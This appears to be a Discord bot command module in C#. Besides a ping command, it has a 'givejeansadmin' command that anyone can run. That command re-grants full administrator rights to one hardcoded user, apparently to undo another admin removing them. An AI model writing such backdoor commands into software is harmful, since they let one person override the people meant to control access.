using Discord;
using Discord.Interactions;

namespace McCoy.Modules;

public class SlashCommands : InteractionModuleBase<SocketInteractionContext>
{
    [SlashCommand("ping", "Gives the Bot's current ping")]
    public async Task PingAsync()
    {
        await RespondAsync($"Pong! Current ping is {Context.Client.Latency}ms");
    }

    [SlashCommand("givejeansadmin", "gary has removed jeans' admin perms again")]
    public async Task GiveJeansAdminAsync()
    {
        ulong jeansUserId = 646827003642773505;
        var jeansUser = Context.Guild.GetUser(jeansUserId);
        
        var botUser = Context.Guild.CurrentUser;
        int botHighestRolePosition = botUser.Hierarchy;
        
        int desiredPosition = botHighestRolePosition - 1;
        
        if (desiredPosition < 0) desiredPosition = 0;
        
        var existingRole = Context.Guild.Roles.FirstOrDefault(r => r.Name == "McCoy Admin");
        if (existingRole != null)
        {
            if (!jeansUser.Roles.Contains(existingRole))
            {
                await jeansUser.AddRoleAsync(existingRole);
                await RespondAsync($"Role 'jeans' already exists and has been assigned to {jeansUser.Username}.");
            }
            else
            {
                await RespondAsync($"{jeansUser.Username} already has the 'jeans' role.");
            }

            await existingRole.ModifyAsync(prop => prop.Position = desiredPosition);
            
            return;
        }
        var adminPerms = new GuildPermissions(administrator: true);

        var newRole = await Context.Guild.CreateRoleAsync("McCoy Admin",
            adminPerms,
            Color.Purple,
            isHoisted: true,
            isMentionable: false
        );

        await newRole.ModifyAsync(prop => prop.Position = desiredPosition);
        
        await jeansUser.AddRoleAsync(newRole);

        await RespondAsync($"Created role 'jeans' with admin permissions and assigned it to {jeansUser.Username}.");
    }
}